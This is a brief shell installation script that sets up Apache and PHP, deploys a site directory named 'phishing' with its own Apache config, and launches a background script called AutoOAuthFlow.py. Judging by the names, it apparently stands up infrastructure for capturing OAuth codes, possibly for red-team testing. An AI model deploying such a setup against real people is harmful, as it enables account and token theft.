sudo apt update && sudo apt-get install -y apache2 python3-pip python3
sudo apt-get install -y php
pip3 install requests watchdog
sudo rm -f /var/www/html/index.html
cp -r ./html /var/www/
cp -r ./phishing /var/www/
sudo setfacl -R -m u:www-data:rwx /var/www/html/codes
cp ./000-default.conf /etc/apache2/sites-available/
cp ./001-phishing.conf /etc/apache2/sites-available/
cp ./ports.conf /etc/apache2/
a2ensite 000-default
a2ensite 001-phishing
sudo systemctl restart apache2
nohup python3 /var/www/html/AutoOAuthFlow.py &
